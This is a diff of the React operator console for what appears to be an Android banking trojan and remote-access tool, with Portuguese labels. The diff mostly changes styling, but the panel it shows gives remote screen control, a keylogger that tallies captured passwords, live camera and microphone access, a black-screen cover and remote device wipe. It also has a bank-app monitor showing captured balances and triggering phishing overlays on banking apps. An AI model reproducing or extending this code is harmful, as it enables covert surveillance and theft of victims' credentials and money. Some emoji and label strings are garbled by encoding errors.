+                                  ? 'bg-[#121214]/40 border-[#2a2a31]/30 hover:border-[#3a3a44]'
+                                  : 'bg-[#360b04] border-[#2a2a31]/15 hover:border-[#2a2a31]/40'
                               }`}
                             >
                               <div className="flex items-center justify-between mb-1">
                                 <span className={`text-[10px] font-bold px-1.5 py-0.5 rounded ${
-                                  isPass ? 'bg-red-900 text-red-300' : isBtn ? 'bg-blue-900 text-cyan-300' : isEdit ? 'bg-amber-900 text-amber-300' : 'bg-slate-800 text-slate-400'
+                                  isPass ? 'bg-[#1a1a1e] text-[#ef4444]' : isBtn ? 'bg-[#1a1a1e] text-[#ef4444]' : isEdit ? 'bg-amber-900 text-amber-300' : 'bg-[#24242a] text-slate-400'
                                 }`}>
-                                  {isPass ? '”‘ Senha' : isBtn ? '‘† Botão' : isEdit ? '“ Input' : '“± Texto'}
+                                  {isPass ? ' Senha' : isBtn ? ' Botão' : isEdit ? ' Input' : '± Texto'}
                                 </span>
                                 {node.bounds && (
-                                  <span className="text-[9px] font-mono text-cyan-400/70">
+                                  <span className="text-[9px] font-mono text-[#ef4444]/70">
                                     [{node.bounds.x},{node.bounds.y}] {node.bounds.w}x{node.bounds.h}
                                   </span>
                                 )}
@@ -12031,11 +12110,11 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                       const normX = (node.bounds!.x + node.bounds!.w / 2) / devW;
                                       const normY = (node.bounds!.y + node.bounds!.h / 2) / devH;
                                       sendCommand({ action: 'CLICK', x: normX, y: normY, scale: 'vnc_norm' });
-                                      addLog(`–± Tocar no elemento: ${label}`);
+                                      addLog(`± Tocar no elemento: ${label}`);
                                     }}
-                                    className="px-2 py-1 bg-cyan-600 hover:bg-cyan-500 text-white rounded-lg text-[10px] font-bold flex items-center gap-1 transition-all"
+                                    className="px-2 py-1 bg-[#ef4444] hover:bg-[#ef4444] text-white rounded-md text-[10px] font-bold flex items-center gap-1 transition-all"
                                   >
-                                    –± Tocar
+                                    ± Tocar
                                   </button>
 
                                   {isEdit && (
@@ -12052,7 +12131,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                           }, 400);
                                         }
                                       }}
-                                      className="px-2 py-1 bg-blue-600 hover:bg-blue-500 text-white rounded-lg text-[10px] font-bold flex items-center gap-1 transition-all"
+                                      className="px-2 py-1 bg-[#ef4444] hover:bg-[#ef4444] text-white rounded-md text-[10px] font-bold flex items-center gap-1 transition-all"
                                     >
                                       ¨ Digitar
                                     </button>
@@ -12072,7 +12151,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
             {/* Controles */}
             <FloatingWindow
               id="controls"
-              title="Ž› Controles"
+              title="Ž Controles"
               isOpen={floatingWindows.controls.open}
               position={{ x: floatingWindows.controls.x, y: floatingWindows.controls.y }}
               size={{ width: floatingWindows.controls.width, height: floatingWindows.controls.height }}
@@ -12081,69 +12160,69 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               onFocus={() => bringToFront('controls')}
               onDrag={(x, y) => updateWindowPosition('controls', x, y)}
               onResize={(w, h) => updateWindowSize('controls', w, h)}
-              headerColor="bg-blue-700"
+              headerColor="bg-[#ef4444]"
             >
               <div className="p-3 space-y-3 overflow-y-auto h-full">
                 {/* Navegação */}
                 <div className="grid grid-cols-3 gap-2">
-                  <button onClick={() => sendCommand({ action: 'BACK' })} className="py-3 bg-slate-700 hover:bg-slate-600 text-white rounded-lg font-bold">◀ Back</button>
-                  <button onClick={() => sendCommand({ action: 'HOME' })} className="py-3 bg-slate-700 hover:bg-slate-600 text-white rounded-lg font-bold">— Home</button>
-                  <button onClick={() => sendCommand({ action: 'RECENTS' })} className="py-3 bg-slate-700 hover:bg-slate-600 text-white rounded-lg font-bold">■ Recent</button>
+                  <button onClick={() => sendCommand({ action: 'BACK' })} className="py-3 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded-md font-bold"> Back</button>
+                  <button onClick={() => sendCommand({ action: 'HOME' })} className="py-3 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded-md font-bold"> Home</button>
+                  <button onClick={() => sendCommand({ action: 'RECENTS' })} className="py-3 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded-md font-bold"> Recent</button>
                 </div>
                 
                 <div>
                   <p className="text-[10px] text-gray-400 font-semibold mb-1">Controle Rápido</p>
                   <div className="grid grid-cols-5 gap-1">
-                    <button type="button" onClick={() => sendCommand({ action: 'VIBRATE' })} className="py-2 bg-amber-700 hover:bg-amber-600 text-white rounded text-[10px] font-bold">📳</button>
-                    <button type="button" onClick={() => sendCommand({ action: 'VOLUME_DOWN' })} className="py-2 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px] font-bold">🔉</button>
-                    <button type="button" onClick={() => sendCommand({ action: 'VOLUME_UP' })} className="py-2 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px] font-bold">🔊</button>
-                    <button type="button" onClick={() => sendCommand({ action: 'LOCK_DEVICE' })} className="py-2 bg-red-800 hover:bg-red-700 text-white rounded text-[10px] font-bold">🔒</button>
-                    <button type="button" onClick={() => sendCommand({ action: 'SNAP_SCREEN' })} className="py-2 bg-teal-700 hover:bg-teal-600 text-white rounded text-[10px] font-bold">📷</button>
+                    <button type="button" onClick={() => sendCommand({ action: 'VIBRATE' })} className="py-2 bg-amber-700 hover:bg-amber-600 text-white rounded text-[10px] font-bold"></button>
+                    <button type="button" onClick={() => sendCommand({ action: 'VOLUME_DOWN' })} className="py-2 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded text-[10px] font-bold"></button>
+                    <button type="button" onClick={() => sendCommand({ action: 'VOLUME_UP' })} className="py-2 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded text-[10px] font-bold"></button>
+                    <button type="button" onClick={() => sendCommand({ action: 'LOCK_DEVICE' })} className="py-2 bg-[#24242a] hover:bg-[#f87171] text-white rounded text-[10px] font-bold"></button>
+                    <button type="button" onClick={() => sendCommand({ action: 'SNAP_SCREEN' })} className="py-2 bg-teal-700 hover:bg-teal-600 text-white rounded text-[10px] font-bold"></button>
                   </div>
                 </div>
                 
                 {/* Power e Ações */}
                 <div className="grid grid-cols-3 gap-2">
-                  <button onClick={() => sendCommand({ action: 'POWER' })} className="py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg font-bold text-xs">» Power</button>
-                  <button onClick={toggleBlackScreen} className={`py-2 rounded-lg font-bold text-xs ${isBlackScreen ? 'bg-orange-600 text-white' : 'bg-slate-700 text-white hover:bg-slate-600'}`}>
-                    {isBlackScreen ? '🔴 Tela ON' : '⬛ Tela Preta'}
+                  <button onClick={() => sendCommand({ action: 'POWER' })} className="py-2 bg-[#ef4444] hover:bg-[#f87171] text-white rounded-md font-bold text-xs">» Power</button>
+                  <button onClick={toggleBlackScreen} className={`py-2 rounded-md font-bold text-xs ${isBlackScreen ? 'bg-[#84cc16] text-white' : 'bg-[#2a2a31] text-white hover:bg-[#6f6f78]'}`}>
+                    {isBlackScreen ? ' Tela ON' : ' Tela Preta'}
                   </button>
                   <button 
                     onClick={handleReconnectConnection} 
                     disabled={isReconnectingConn}
-                    className={`py-2 text-white rounded-lg font-bold text-xs flex items-center justify-center gap-1 shadow-md transition-all ${
+                    className={`py-2 text-white rounded-md font-bold text-xs flex items-center justify-center gap-1 shadow-md transition-all ${
                       isReconnectingConn ? 'bg-amber-800 animate-pulse cursor-wait' : 'bg-amber-600 hover:bg-amber-700 active:scale-95'
                     }`} 
                     title="Reiniciar íconexão WebSocket do Aparelho"
                   >
-                    <span className={isReconnectingConn ? 'animate-spin' : ''}>🔌</span>
+                    <span className={isReconnectingConn ? 'animate-spin' : ''}></span>
                     {isReconnectingConn ? 'Reíconectando...' : 'Reíconectar'}
                   </button>
                 </div>
                 
                 <div className="grid grid-cols-2 gap-2">
-                  <button onClick={() => sendCommand({ action: 'NOTIFICATIONS' })} className="py-2 bg-blue-600 hover:bg-blue-750 text-white rounded-lg text-sm font-bold">🔔 Notificações</button>
-                  <button onClick={() => sendCommand({ action: 'QUICK_SETTINGS' })} className="py-2 bg-blue-600 hover:bg-blue-750 text-white rounded-lg text-sm font-bold">š™ Config</button>
+                  <button onClick={() => sendCommand({ action: 'NOTIFICATIONS' })} className="py-2 bg-[#ef4444] hover:bg-[#f87171] text-white rounded-md text-sm font-bold"> Notificações</button>
+                  <button onClick={() => sendCommand({ action: 'QUICK_SETTINGS' })} className="py-2 bg-[#ef4444] hover:bg-[#f87171] text-white rounded-md text-sm font-bold">š Config</button>
                 </div>
                 
                 <button 
                   onClick={handleFormatDevice} 
-                  className="w-full py-2 bg-red-950 hover:bg-red-800 text-white rounded-lg text-xs font-bold border border-red-700 tracking-wider uppercase transition-all"
+                  className="w-full py-2 bg-[#121214] hover:bg-[#24242a] text-white rounded-md text-xs font-bold border border-[#3a3a44] tracking-wider uppercase transition-all"
                 >
-                  🚨 Formatar Equipamento (Reset)
+                   Formatar Equipamento (Reset)
                 </button>
                 
                 {/* Captura */}
                 <div className="flex gap-2">
-                  <button onClick={toggleCapture} className={`flex-1 py-2 rounded-lg font-bold ${isCaptureEnabled ? 'bg-green-600 text-white' : 'bg-slate-700 text-white hover:bg-slate-600'}`}>
-                    {isCaptureEnabled ? '”´ Captura Ativa' : '–¶ Iniciar Captura'}
+                  <button onClick={toggleCapture} className={`flex-1 py-2 rounded-md font-bold ${isCaptureEnabled ? 'bg-green-600 text-white' : 'bg-[#2a2a31] text-white hover:bg-[#6f6f78]'}`}>
+                    {isCaptureEnabled ? '´ Captura Ativa' : '¶ Iniciar Captura'}
                   </button>
                   <button 
                     onClick={restartCapture}
-                    className="px-3 py-2 bg-orange-600 hover:bg-orange-700 text-white rounded-lg font-bold"
+                    className="px-3 py-2 bg-[#84cc16] hover:bg-orange-700 text-white rounded-md font-bold"
                     title="Reiniciar VNC - Use se perdeu íconexão"
                   >
-                    🔄
+                    
                   </button>
                 </div>
                 
@@ -12155,9 +12234,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     onChange={(e) => setTextToSend(e.target.value)}
                     onKeyPress={(e) => e.key === 'Enter' && handleSendText()}
                     placeholder="Digite o texto..."
-                    className="w-full px-3 py-2 bg-slate-700 border border-blue-500/25 rounded text-white placeholder-gray-400"
+                    className="w-full px-3 py-2 bg-[#2a2a31] border border-[#2a2a31]/25 rounded text-white placeholder-gray-400"
                   />
-                  <button onClick={handleSendText} disabled={!textToSend.trim()} className="w-full py-2 bg-blue-600 hover:bg-blue-700 disabled:bg-slate-700 text-white rounded-lg font-bold">
+                  <button onClick={handleSendText} disabled={!textToSend.trim()} className="w-full py-2 bg-[#ef4444] hover:bg-[#f87171] disabled:bg-[#2a2a31] text-white rounded-md font-bold">
                     Enviar Texto
                   </button>
                 </div>
@@ -12167,7 +12246,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
             {/* Cmera */}
             <FloatingWindow
               id="camera"
-              title="📷 Cmera"
+              title=" Cmera"
               isOpen={floatingWindows.camera.open}
               position={{ x: floatingWindows.camera.x, y: floatingWindows.camera.y }}
               size={{ width: floatingWindows.camera.width, height: floatingWindows.camera.height }}
@@ -12179,13 +12258,13 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               onFocus={() => bringToFront('camera')}
               onDrag={(x, y) => updateWindowPosition('camera', x, y)}
               onResize={(w, h) => updateWindowSize('camera', w, h)}
-              headerColor="bg-cyan-700"
+              headerColor="bg-[#ef4444]"
             >
               <div className="h-full bg-black flex items-center justify-center">
                 <canvas ref={cameraCanvasRef} className="max-w-full max-h-full" />
                 <div className="absolute bottom-2 left-2 right-2 flex justify-center space-x-2">
-                  <button onClick={switchCamera} className="px-3 py-1 bg-slate-700 hover:bg-slate-600 text-white rounded text-sm">
-                    🔄 {currentCamera === 'back' ? 'Frontal' : 'Traseira'}
+                  <button onClick={switchCamera} className="px-3 py-1 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded text-sm">
+                     {currentCamera === 'back' ? 'Frontal' : 'Traseira'}
                   </button>
                 </div>
               </div>
@@ -12194,7 +12273,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
             {/* Microfone */}
             <FloatingWindow
               id="microphone"
-              title="🎤 Microfone"
+              title=" Microfone"
               isOpen={floatingWindows.microphone.open}
               position={{ x: floatingWindows.microphone.x, y: floatingWindows.microphone.y }}
               size={{ width: floatingWindows.microphone.width, height: floatingWindows.microphone.height }}
@@ -12206,11 +12285,11 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               onFocus={() => bringToFront('microphone')}
               onDrag={(x, y) => updateWindowPosition('microphone', x, y)}
               onResize={(w, h) => updateWindowSize('microphone', w, h)}
-              headerColor="bg-pink-700"
+              headerColor="bg-[#4d7c0f]"
             >
-              <div className="h-full bg-[#290903] flex items-center justify-center">
+              <div className="h-full bg-[#1a1a1e] flex items-center justify-center">
                 <div className="text-center">
-                  <div className="text-6xl mb-4 animate-pulse">🎤</div>
+                  <div className="text-6xl mb-4 animate-pulse"></div>
                   <p className="text-white font-bold">Ouvindo...</p>
                   <p className="text-gray-400 text-sm mt-2">udio em tempo real ativo</p>
                 </div>
@@ -12231,29 +12310,29 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               onResize={(w, h) => updateWindowSize('keylogger', w, h)}
               headerColor="bg-gradient-to-r from-yellow-700 to-orange-700"
             >
-              <div className="p-3 h-full overflow-y-auto bg-gradient-to-br from-slate-800 to-slate-900">
-                {/* “Š RESUMO ESTATSTICO */}
+              <div className="p-3 h-full overflow-y-auto bg-gradient-to-br from-[#24242a] to-[#121214]">
+                {/* Š RESUMO ESTATSTICO */}
                 {keylogSummary && (
                   <div className="grid grid-cols-3 gap-2 mb-3">
-                    <div className="bg-slate-700/50 rounded-lg p-2 text-center">
+                    <div className="bg-[#2a2a31]/50 rounded-md p-2 text-center">
                       <div className="text-lg font-bold text-yellow-400">{keylogSummary.total_logs || 0}</div>
                       <div className="text-[9px] text-gray-400">Total</div>
                     </div>
-                    <div className="bg-slate-700/50 rounded-lg p-2 text-center">
+                    <div className="bg-[#2a2a31]/50 rounded-md p-2 text-center">
                       <div className="text-lg font-bold text-green-400">{keylogSummary.today_logs || 0}</div>
                       <div className="text-[9px] text-gray-400">Hoje</div>
                     </div>
-                    <div className="bg-slate-700/50 rounded-lg p-2 text-center">
-                      <div className="text-lg font-bold text-red-400">{keylogSummary.passwords_captured || 0}</div>
+                    <div className="bg-[#2a2a31]/50 rounded-md p-2 text-center">
+                      <div className="text-lg font-bold text-[#ef4444]">{keylogSummary.passwords_captured || 0}</div>
                       <div className="text-[9px] text-gray-400">Senhas</div>
                     </div>
                   </div>
                 )}
                 
-                {/* 📅 SELETOR DE DATA */}
-                <div className="bg-slate-700/30 rounded-lg p-2 mb-3">
+                {/*  SELETOR DE DATA */}
+                <div className="bg-[#2a2a31]/30 rounded-md p-2 mb-3">
                   <div className="flex items-center justify-between mb-2">
-                    <span className="text-xs text-gray-400">📅 Selecionar Data:</span>
+                    <span className="text-xs text-gray-400"> Selecionar Data:</span>
                     <button
                       onClick={() => {
                         const d = new Date();
@@ -12270,7 +12349,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     type="date"
                     value={keylogSelectedDate}
                     onChange={(e) => setKeylogSelectedDate(e.target.value)}
-                    className="w-full px-3 py-2 bg-[#440e05] border border-blue-500/25 rounded-lg text-white text-sm focus:outline-none focus:border-yellow-500"
+                    className="w-full px-3 py-2 bg-[#121214] border border-[#2a2a31]/25 rounded-md text-white text-sm focus:outline-none focus:border-yellow-500"
                     max={(() => {
                       const d = new Date();
                       return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
@@ -12287,7 +12366,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                           className={`px-2 py-1 text-[9px] rounded ${
                             d.date === keylogSelectedDate
                               ? 'bg-yellow-600 text-white'
-                              : 'bg-slate-600 text-gray-300 hover:bg-slate-500'
+                              : 'bg-[#6f6f78] text-gray-300 hover:bg-[#8b8b94]'
                           }`}
                         >
                           {new Date(d.date + 'T12:00:00').toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit' })}
@@ -12298,7 +12377,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   )}
                 </div>
                 
-                {/* 📜 LISTA DE KEYLOGS DO DIA */}
+                {/*  LISTA DE KEYLOGS DO DIA */}
                 <div className="flex items-center justify-between mb-2">
                   <h4 className="text-sm font-semibold text-white flex items-center">
                     <Keyboard className="w-4 h-4 mr-2 text-yellow-400" />
@@ -12313,7 +12392,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   </h4>
                   <button
                     onClick={downloadKeylogs}
-                    className="flex items-center px-2 py-1 bg-blue-600 hover:bg-blue-700 text-white text-[10px] rounded"
+                    className="flex items-center px-2 py-1 bg-[#ef4444] hover:bg-[#f87171] text-white text-[10px] rounded"
                   >
                     <Download className="w-3 h-3 mr-1" />
                     Baixar
@@ -12326,25 +12405,25 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     <p className="text-sm text-gray-400">Carregando...</p>
                   </div>
                 ) : keylogsByDate.length > 0 ? (
-                  <div className="bg-[#290903]/50 rounded-lg p-2 space-y-1 max-h-[300px] overflow-y-auto">
+                  <div className="bg-[#1a1a1e]/50 rounded-md p-2 space-y-1 max-h-[300px] overflow-y-auto">
                     {/* INVERTIDO: Logs mais recentes primeiro (em cima) */}
                     {[...keylogsByDate].reverse().map((log, i) => {
                       const friendlyName = getAppFriendlyName(log.package || '', log.appName || '');
                       return (
-                        <div key={i} className={`p-2 rounded-lg ${
+                        <div key={i} className={`p-2 rounded-md ${
                           log.isPassword 
-                            ? 'bg-red-900/40 border border-red-500/50' 
-                            : 'bg-[#440e05]/50'
+                            ? 'bg-[#1a1a1e]/40 border border-[#2a2a31]/50' 
+                            : 'bg-[#121214]/50'
                         }`}>
                           <div className="flex items-center justify-between text-[10px]">
                             <span className="text-yellow-400 font-mono">{log.time}</span>
-                            <span className="text-blue-400 font-semibold truncate max-w-[120px]">{friendlyName}</span>
-                            {log.isOffline && <span className="text-cyan-400">📴</span>}
+                            <span className="text-[#ef4444] font-semibold truncate max-w-[120px]">{friendlyName}</span>
+                            {log.isOffline && <span className="text-[#ef4444]"></span>}
                           </div>
                           <div className={`font-mono text-sm break-all mt-1 ${
-                            log.isPassword ? 'text-red-400 font-bold' : 'text-white'
+                            log.isPassword ? 'text-[#ef4444] font-bold' : 'text-white'
                           }`}>
-                            {log.isPassword && '🔑 '}
+                            {log.isPassword && ' '}
                             {log.text}
                           </div>
                           {log.eventType && log.eventType !== 'TEXT_CHANGED' && (
@@ -12357,55 +12436,55 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     })}
                   </div>
                 ) : (
-                  <div className="text-center py-8 bg-[#290903]/30 rounded-lg">
-                    <div className="text-3xl mb-2">📭</div>
+                  <div className="text-center py-8 bg-[#1a1a1e]/30 rounded-md">
+                    <div className="text-3xl mb-2"></div>
                     <p className="text-sm text-gray-400">Nenhum keylog nesta data</p>
                     <p className="text-[10px] text-gray-500 mt-1">Selecione outra data ou aguarde</p>
                   </div>
                 )}
                 
-                {/* 🔴 INDICADOR DE TEMPO REAL - Sem pulsação excessiva */}
+                {/*  INDICADOR DE TEMPO REAL - Sem pulsação excessiva */}
                 {keylogSelectedDate === (() => {
                   const d = new Date();
                   return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
                 })() && (
                   <div className="mt-3 flex items-center justify-center gap-2 text-[10px] text-green-400">
                     <span className="w-2 h-2 bg-green-500 rounded-full"></span>
-                    🟢 Atualizando em tempo real
+                     Atualizando em tempo real
                   </div>
                 )}
                 
                 {/* LEGENDA */}
                 <div className="mt-3 flex items-center justify-center gap-4 text-[9px] text-gray-500">
-                  <span>🔑 = Senha</span>
-                  <span>📴 = Offline</span>
+                  <span> = Senha</span>
+                  <span> = Offline</span>
                   <span> = Banco</span>
                 </div>
               </div>
             </FloatingWindow>
             
-            {/*  MONITOR BANCRIO COMPLETO ” removido modo flutuante, funciona como aba nativa */}
+            {/*  MONITOR BANCRIO COMPLETO  removido modo flutuante, funciona como aba nativa */}
             {false && <div id="bankMonitor-removed">
               <div className="h-full flex flex-col md:flex-row bg-[#250703]/95 text-slate-200 overflow-hidden">
                 {/* Lateral Esquerda - Lista de Bancos Instalados */}
-                <div className="w-full md:w-2/5 border-r border-cyan-500/10 flex flex-col bg-[#300a03]/70 overflow-hidden">
-                  <div className="p-3 bg-slate-900/60 border-b border-cyan-500/10 flex items-center justify-between flex-shrink-0">
-                    <span className="text-xs font-black uppercase text-cyan-400 tracking-wider">
+                <div className="w-full md:w-2/5 border-r border-[#2a2a31]/10 flex flex-col bg-[#300a03]/70 overflow-hidden">
+                  <div className="p-3 bg-[#121214]/60 border-b border-[#2a2a31]/10 flex items-center justify-between flex-shrink-0">
+                    <span className="text-xs font-black uppercase text-[#ef4444] tracking-wider">
                        Bancos no Aparelho
                     </span>
                     <button
                       onClick={fetchInstalledApps}
                       disabled={isLoadingApps}
-                      className="px-2.5 py-1 text-[10px] bg-cyan-950 hover:bg-cyan-900 border border-cyan-500/30 text-cyan-300 font-bold rounded transition-all"
+                      className="px-2.5 py-1 text-[10px] bg-[#121214] hover:bg-[#1a1a1e] border border-[#2a2a31]/30 text-[#ef4444] font-bold rounded transition-all"
                     >
-                      {isLoadingApps ? '⌛ Buscando...' : '🔄 Sincronizar'}
+                      {isLoadingApps ? ' Buscando...' : ' Sincronizar'}
                     </button>
                   </div>
                   
                   <div className="flex-1 overflow-y-auto p-2 space-y-2">
                     {installedBanks.length === 0 ? (
-                      <div className="text-center py-10 text-slate-500 text-xs">
-                        <span className="text-3xl block mb-2">”</span>
+                      <div className="text-center py-10 text-[#8b8b94] text-xs">
+                        <span className="text-3xl block mb-2"></span>
                         Nenhum app de banco identificado. 
                         <br/>
                         Use o botão "Sincronizar" acima.
@@ -12421,14 +12500,14 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                           <div
                             key={idx}
                             onClick={() => setSelectedMonitorBank(app)}
-                            className={`p-2.5 rounded-xl border cursor-pointer transition-all duration-200 relative overflow-hidden group ${
+                            className={`p-2.5 rounded-md border cursor-pointer transition-all duration-200 relative overflow-hidden group ${
                               isSelected 
-                                ? 'bg-gradient-to-r from-cyan-950/80 via-[#380b04]/90 to-blue-950/70 border-cyan-400/80 shadow-[0_0_15px_rgba(255,43,43,0.2)]' 
-                                : 'bg-[#240703]/80 hover:bg-[#3e0d05]/90 border-cyan-500/15 hover:border-cyan-500/40 shadow-sm'
+                                ? 'bg-gradient-to-r from-[#121214]/80 via-[#380b04]/90 to-[#121214]/70 border-[#3a3a44]/80 shadow-[0_0_15px_rgba(239,68,68,0.2)]' 
+                                : 'bg-[#240703]/80 hover:bg-[#3e0d05]/90 border-[#2a2a31]/15 hover:border-[#2a2a31]/40 shadow-sm'
                             }`}
                           >
                             {isSelected && (
-                              <div className="absolute top-0 left-0 w-1 h-full bg-gradient-to-b from-cyan-400 to-blue-500 shadow-[0_0_8px_#ff2b2b]" />
+                              <div className="absolute top-0 left-0 w-1 h-full bg-gradient-to-b from-[#f87171] to-[#ef4444] shadow-[0_0_8px_#ef4444]" />
                             )}
                             <div className="flex items-center justify-between gap-2">
                               <div className="flex items-center space-x-3 min-w-0 flex-1">
@@ -12437,16 +12516,16 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                   {isAppOpen && (
                                     <span className="absolute -top-1 -right-1 flex h-2.5 w-2.5">
                                       <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75" />
-                                      <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500 border border-slate-900" />
+                                      <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500 border border-[#121214]" />
                                     </span>
                                   )}
                                 </div>
                                 <div className="min-w-0 flex-1">
-                                  <h4 className="font-black text-xs text-white truncate group-hover:text-cyan-300 transition-colors">{app.name}</h4>
+                                  <h4 className="font-black text-xs text-white truncate group-hover:text-[#ef4444] transition-colors">{app.name}</h4>
                                   {appBalanceObj ? (
                                     <p className="text-[10px] text-emerald-400 font-bold font-mono truncate drop-shadow-[0_0_6px_rgba(52,211,153,0.3)]">{appBalanceObj.balance}</p>
                                   ) : (
-                                    <p className="text-[9px] text-slate-500 truncate font-mono">Sem saldo capturado</p>
+                                    <p className="text-[9px] text-[#8b8b94] truncate font-mono">Sem saldo capturado</p>
                                   )}
                                 </div>
                               </div>
@@ -12455,17 +12534,17 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                 {isAppOpen ? (
                                   <span className="px-2 py-0.5 rounded-full text-[8px] font-black uppercase bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 animate-pulse shadow-[0_0_8px_rgba(16,185,129,0.3)] flex items-center gap-1">
                                     <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping" />
-                                    🟢 ABERTO
+                                     ABERTO
                                   </span>
                                 ) : lastAccessInfo ? (
-                                  <span className="inline-flex items-center gap-1 text-[8px] font-mono text-cyan-300 bg-cyan-950/70 border border-cyan-500/30 px-1.5 py-0.5 rounded-md shadow-sm" title={`Último Acesso: ${lastAccessInfo.fullLabel}`}>
-                                    <Clock className="w-2.5 h-2.5 text-cyan-400" />
+                                  <span className="inline-flex items-center gap-1 text-[8px] font-mono text-[#ef4444] bg-[#121214]/70 border border-[#2a2a31]/30 px-1.5 py-0.5 rounded-md shadow-sm" title={`Último Acesso: ${lastAccessInfo.fullLabel}`}>
+                                    <Clock className="w-2.5 h-2.5 text-[#ef4444]" />
                                     <span className="text-slate-400 uppercase text-[7px]">ACESSO:</span>
-                                    <span className="font-bold text-cyan-200">{lastAccessInfo.formattedRelative}</span>
+                                    <span className="font-bold text-[#e8e8ea]">{lastAccessInfo.formattedRelative}</span>
                                   </span>
                                 ) : (
-                                  <span className="inline-flex items-center gap-1 text-[8px] font-mono text-slate-500 bg-slate-900/60 border border-slate-800 px-1.5 py-0.5 rounded-md">
-                                    <Clock className="w-2.5 h-2.5 text-slate-600" />
+                                  <span className="inline-flex items-center gap-1 text-[8px] font-mono text-[#8b8b94] bg-[#121214]/60 border border-[#24242a] px-1.5 py-0.5 rounded-md">
+                                    <Clock className="w-2.5 h-2.5 text-[#6f6f78]" />
                                     Sem dados
                                   </span>
                                 )}
@@ -12491,26 +12570,26 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     return (
                       <div className="flex-1 flex flex-col overflow-hidden p-4">
                         {/* Header do Banco Selecionado */}
-                        <div className="flex items-center justify-between pb-3 border-b border-cyan-500/10 flex-shrink-0">
+                        <div className="flex items-center justify-between pb-3 border-b border-[#2a2a31]/10 flex-shrink-0">
                           <div>
                             <h2 className="text-lg font-black text-white flex items-center">
                                {app.name}
                             </h2>
-                            <p className="text-xs text-slate-500 font-mono">{app.package}</p>
+                            <p className="text-xs text-[#8b8b94] font-mono">{app.package}</p>
                           </div>
                           
                           <div className="flex items-center space-x-2">
                             <button
                               onClick={() => openApp(app.package, app.name)}
-                              className="px-3 py-1.5 bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-500 hover:to-cyan-400 text-white text-xs font-bold rounded-lg transition-all shadow-[0_0_10px_rgba(239,68,68,0.3)]"
+                              className="px-3 py-1.5 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#f87171] text-[#10120a] text-xs font-bold rounded-md transition-all shadow-[0_0_10px_rgba(239,68,68,0.3)]"
                             >
-                              ⚡ Abrir App
+                               Abrir App
                             </button>
                             <button
                               onClick={() => forceStopApp(app.package, app.name)}
-                              className="px-3 py-1.5 bg-red-650 hover:bg-red-650/80 text-white text-xs font-bold rounded-lg transition-all"
+                              className="px-3 py-1.5 bg-red-650 hover:bg-red-650/80 text-white text-xs font-bold rounded-md transition-all"
                             >
-                              ⛔ Forçar Parada
+                               Forçar Parada
                             </button>
                           </div>
                         </div>
@@ -12519,9 +12598,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                         {(() => {
                           const currentMapping = overlayMappings.find(m => m.package_name === app.package);
                           return (
-                            <div className="p-3 bg-purple-950/20 border border-purple-500/20 rounded-xl flex items-center justify-between flex-shrink-0 text-xs">
+                            <div className="p-3 bg-purple-950/20 border border-[#f87171]/20 rounded-md flex items-center justify-between flex-shrink-0 text-xs">
                               <div className="flex items-center space-x-2">
-                                <span className="text-[10px] text-purple-400 font-bold uppercase tracking-wider">💉 Auto-Gatilho de Tela:</span>
+                                <span className="text-[10px] text-[#f87171] font-bold uppercase tracking-wider"> Auto-Gatilho de Tela:</span>
                                 <select
                                   value={currentMapping ? `${currentMapping.project_id}|${currentMapping.screen_id}` : ''}
                                   onChange={(e) => {
@@ -12544,7 +12623,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                       }
                                     }
                                   }}
-                                  className="bg-black/60 border border-blue-500/20 text-white rounded px-2 py-1 focus:outline-none focus:border-purple-500"
+                                  className="bg-black/60 border border-[#2a2a31]/20 text-white rounded px-2 py-1 focus:outline-none focus:border-[#f87171]"
                                 >
                                   <option value="">-- Sem Overlay Automática --</option>
                                   {projects.map((p: any) => 
@@ -12560,7 +12639,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                 <button
                                   type="button"
                                   onClick={() => applyCustomBlackScreen(currentMapping.template)}
-                                  className="px-2 py-1 bg-purple-600 hover:bg-purple-700 text-white font-bold rounded text-[10px]"
